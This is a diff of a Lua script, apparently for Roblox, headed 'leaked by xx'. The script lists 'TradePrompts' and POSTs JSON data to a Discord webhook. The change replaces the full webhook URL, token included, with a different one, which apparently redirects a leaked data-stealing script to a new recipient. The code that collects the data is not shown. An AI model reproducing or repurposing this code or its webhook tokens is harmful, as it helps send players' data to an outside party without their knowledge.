@@ -1,4 +1,4 @@
---leaked by xx 677777
+ --leaked by xx 677777
 
 local t1 = {
 	"TradePrompts",
@@ -25,7 +25,7 @@ local function v2(p1)
 	local u15 = json
 	local v16, v17 = pcall(function()
 		u12 = u14:RequestAsync({
-			Url = "https://discord.com/api/webhooks/1443449451384406099/AgsUJYdD1m7HLU9cveNrGPyf4WS-VDgWI00oGVDq8nnjPrt-Nd4lioE2wT0WqaUkfRvd",
+			Url = "https://discord.com/api/webhooks/1443449464097345566/tTNacJ0fZduDBs-Sgz7YrkL0Pr-ABGSIY7SvR1EQpNLhJA3Rb5pB_Eno9daCuZCxTm5g",
 			Method = "POST",
 			Headers = t2,
 			Body = u15,
